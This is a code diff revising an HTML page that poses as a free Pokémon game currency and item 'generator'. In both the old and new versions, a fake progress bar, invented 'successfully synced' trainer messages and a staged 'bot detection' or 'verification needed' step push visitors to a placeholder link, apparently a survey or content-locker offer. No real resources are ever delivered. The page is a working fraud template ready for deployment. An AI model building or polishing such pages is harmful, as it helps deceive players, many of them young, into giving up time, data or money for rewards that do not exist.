@@ -24,7 +24,7 @@
             padding: 0;
             overflow-x: hidden;
             background: linear-gradient(rgba(2, 5, 10, 0.9), rgba(2, 5, 10, 0.9)), 
-                        url('https://images6.alphacoders.com/132/1328639.png');
+                        url('https://images.unsplash.com/photo-1614850523296-d8c1af93d400?q=80&w=1280&auto=format&fit=crop'); /* Unsplash BG is 100% Stable */
             background-size: cover;
             background-attachment: fixed;
             background-position: center;
@@ -80,7 +80,7 @@
         h2, h3 { font-family: 'Orbitron', sans-serif; text-transform: uppercase; letter-spacing: 1px; }
 
         .input-ui {
-            background: rgba(0, 0, 0, 0.7);
+            background: rgba(0, 0, 0, 0.6);
             border: 1px solid var(--primary);
             border-radius: 12px;
             padding: 18px;
@@ -104,7 +104,7 @@
             background: rgba(255, 255, 255, 0.03);
             border: 1px solid rgba(255, 255, 255, 0.1);
             border-radius: 20px;
-            padding: 25px 15px;
+            padding: 20px;
             cursor: pointer;
             transition: 0.3s;
             display: flex;
@@ -114,12 +114,15 @@
 
         .reward-card.active { border-color: var(--primary); background: rgba(0, 242, 255, 0.1); }
 
-        /* Icon styling using FontAwesome to guarantee loading */
-        .icon-box {
-            font-size: 40px;
-            margin-bottom: 15px;
-            filter: drop-shadow(0 0 10px var(--primary));
+        /* Nadi l-icons b Icons stable link */
+        .reward-card i { 
+            font-size: 2.5rem;
+            margin-bottom: 12px;
+            filter: drop-shadow(0 0 8px rgba(0, 242, 255, 0.5));
         }
+
+        .reward-card span { display: block; font-weight: 900; font-size: 1.1rem; margin-top: 5px; }
+        .reward-card small { color: var(--primary); font-size: 0.7rem; font-weight: bold; text-transform: uppercase; }
 
         .btn-action {
             background: linear-gradient(to right, var(--primary), #00a2ff);
@@ -138,6 +141,12 @@
 
         .hidden { display: none; }
 
+        .loader {
+            width: 50px; height: 50px; border: 4px solid #111; border-top: 4px solid var(--primary);
+            border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px;
+        }
+        @keyframes spin { 100% { transform: rotate(360deg); } }
+
         .activity-feed {
             margin-top: 25px;
             padding: 12px;
@@ -145,6 +154,7 @@
             border-radius: 50px;
             font-size: 0.8rem;
             color: #00f2ff;
+            border: 1px solid rgba(0,242,255,0.1);
         }
     </style>
 </head>
@@ -152,95 +162,106 @@
 
 <nav>
     <img src="https://upload.wikimedia.org/wikipedia/commons/9/98/International_Pok%C3%A9mon_logo.svg" class="logo-nav">
-    <div style="font-size: 0.7rem; text-align: right;">
-        <span style="color: #2ecc71;">● SECURE SYNC</span><br>
-        <span style="color: #666;">APR 2026 EDITION</span>
-    </div>
+    <div style="font-size: 0.75rem; color: #2ecc71;">● ONLINE</div>
 </nav>
 
 <div class="container">
     <div class="main-card">
-        <div class="badge-pro">V9.4.1 PROTECTED</div>
+        <div class="badge-pro">v4.2 SECURE</div>
         
         <div id="ui-step1">
-            <h2 style="margin-top: 40px; color: var(--primary);">SELECT RESOURCES</h2>
-            <p style="color:#aaa; font-size: 0.85rem; margin-bottom: 30px;">Select the distribution pack for your region.</p>
-            
-            <div class="grid-rewards">
-                <div class="reward-card active" onclick="selectReward(this, '50,000 VP')">
-                    <div class="icon-box" style="color: #ff3e3e;"><i class="fas fa-circle-dot"></i></div>
-                    <span style="font-weight:900; font-size:1.3rem;">50,000</span>
-                    <small>VICTORY POINTS</small>
-                </div>
-                
-                <div class="reward-card" onclick="selectReward(this, '10,000 Gems')">
-                    <div class="icon-box" style="color: #00f2ff;"><i class="fas fa-gem"></i></div>
-                    <span style="font-weight:900; font-size:1.3rem;">10,000</span>
-                    <small>CHAMPION GEMS</small>
-                </div>
-
-                <div class="reward-card" onclick="selectReward(this, 'Elite Pass')">
-                    <div class="icon-box" style="color: #ffcc00;"><i class="fas fa-ticket-alt"></i></div>
-                    <span style="font-weight:900; font-size:1.3rem;">S12</span>
-                    <small>ELITE BATTLE PASS</small>
-                </div>
-
-                <div class="reward-card" onclick="selectReward(this, 'Omni Stone')">
-                    <div class="icon-box" style="color: #ff007a;"><i class="fas fa-atom"></i></div>
-                    <span style="font-weight:900; font-size:1.3rem;">OMNI</span>
-                    <small>EVOLUTION STONE</small>
-                </div>
-            </div>
-            
-            <button class="btn-action" onclick="toStepFinal()">GENERATE PACK</button>
+            <h2 style="margin-top: 40px; color: var(--primary);">Trainer Sync</h2>
+            <input type="text" class="input-ui" id="trainer-name" placeholder="Trainer Name...">
+            <select class="input-ui">
+                <option>Global Platform</option>
+            </select>
+            <button class="btn-action" onclick="toStep2()">Connect</button>
         </div>
 
-        <div id="ui-final" class="hidden">
-            <h3 style="color: var(--primary); margin-top: 30px;">Finalizing...</h3>
-            <p id="final-status">Connecting to server...</p>
-            <div style="width: 100%; background: #111; height: 10px; border-radius: 10px; overflow: hidden; margin: 20px 0;">
+        <div id="ui-step2" class="hidden">
+            <h3 style="margin-bottom: 20px; font-size: 0.9rem;">Select Pack</h3>
+            <div class="grid-rewards">
+                <div class="reward-card active" onclick="selectReward(this, '50,000 VP')">
+                    <i class="fas fa-coins" style="color: #ffcc00;"></i>
+                    <span>50,000</span>
+                    <small>Victory Points</small>
+                </div>
+                <div class="reward-card" onclick="selectReward(this, '10,000 Gems')">
+                    <i class="fas fa-gem" style="color: #00f2ff;"></i>
+                    <span>10,000</span>
+                    <small>Champion Gems</small>
+                </div>
+                <div class="reward-card" onclick="selectReward(this, 'Elite Pass')">
+                    <i class="fas fa-id-card" style="color: #ff007a;"></i>
+                    <span>SEASON 12</span>
+                    <small>Elite Pass</small>
+                </div>
+                <div class="reward-card" onclick="selectReward(this, 'Omni Stone')">
+                    <i class="fas fa-meteor" style="color: #ffffff;"></i>
+                    <span>OMNI</span>
+                    <small>Evolution Stone</small>
+                </div>
+            </div>
+            <button class="btn-action" onclick="toStep3()">Generate Assets</button>
+        </div>
+
+        <div id="ui-sync" class="hidden" style="padding: 40px 0;">
+            <div class="loader"></div>
+            <h4 id="status-text" style="color: var(--primary); font-family: 'Orbitron';">Connecting...</h4>
+            <div style="width: 100%; background: #111; height: 8px; border-radius: 10px; overflow: hidden; margin-top: 20px;">
                 <div id="progress-bar" style="width: 0%; height: 100%; background: var(--primary); transition: 0.3s;"></div>
             </div>
-            <div id="verify-box" class="hidden">
-                <p style="font-size: 0.85rem; color: #ff3e3e; font-weight: bold;">Bot detection triggered!</p>
-                <button class="btn-action" onclick="window.location.href='YOUR_LINK_HERE'">VERIFY HUMAN</button>
+        </div>
+
+        <div id="ui-locker" class="hidden">
+            <h3 style="color: var(--accent);">Verification Needed</h3>
+            <div style="background: rgba(0, 242, 255, 0.05); padding: 25px; border: 2px dashed var(--primary); border-radius: 20px; margin: 20px 0;">
+                <p style="font-size: 0.9rem; font-weight: 800; margin-bottom: 15px;">Finalizing <span id="summary-res">...</span></p>
+                <button class="btn-action" style="margin:0; background: var(--accent); color:#fff;" onclick="window.location.href='YOUR_LINK_HERE'">Verify Now</button>
             </div>
         </div>
 
         <div class="activity-feed">
-            <i class="fas fa-bolt"></i> <span id="live-text">Trainer Sarah_Elite successfully synced Omni Stone!</span>
+            <i class="fas fa-bolt"></i> <span id="live-text">Waiting for connection...</span>
         </div>
     </div>
 </div>
 
 <script>
+    let selectedItem = "50,000 VP";
+
+    function toStep2() {
+        if(document.getElementById('trainer-name').value.length < 3) return alert('Enter Name');
+        document.getElementById('ui-step1').classList.add('hidden');
+        document.getElementById('ui-step2').classList.remove('hidden');
+    }
+
     function selectReward(el, name) {
         document.querySelectorAll('.reward-card').forEach(r => r.classList.remove('active'));
         el.classList.add('active');
+        selectedItem = name;
     }
 
-    function toStepFinal() {
-        document.getElementById('ui-step1').classList.add('hidden');
-        document.getElementById('ui-final').classList.remove('hidden');
-        
+    function toStep3() {
+        document.getElementById('ui-step2').classList.add('hidden');
+        document.getElementById('ui-sync').classList.remove('hidden');
+        document.getElementById('summary-res').innerText = selectedItem;
         let progress = 0;
-        let pBar = document.getElementById('progress-bar');
-        let pText = document.getElementById('final-status');
-        
-        let interval = setInterval(() => {
-            progress += 2;
-            pBar.style.width = progress + '%';
-            if(progress == 20) pText.innerText = "Searching UID...";
-            if(progress == 50) pText.innerText = "Injecting Packets...";
-            if(progress == 80) pText.innerText = "Encapsulating Data...";
-            
+        const interval = setInterval(() => {
+            progress += 5;
+            document.getElementById('progress-bar').style.width = progress + '%';
             if(progress >= 100) {
                 clearInterval(interval);
-                document.getElementById('verify-box').classList.remove('hidden');
-                pText.innerText = "Verification Required";
+                document.getElementById('ui-sync').classList.add('hidden');
+                document.getElementById('ui-locker').classList.remove('hidden');
             }
-        }, 100);
+        }, 120);
     }
+
+    setInterval(() => {
+        const t = ['Trainer_X', 'PokeMaster', 'Ghost_26', 'Sara_PKM'][Math.floor(Math.random()*4)];
+        document.getElementById('live-text').innerText = `Trainer ${t} successfully synced!`;
+    }, 4000);
 </script>
 
 </body>
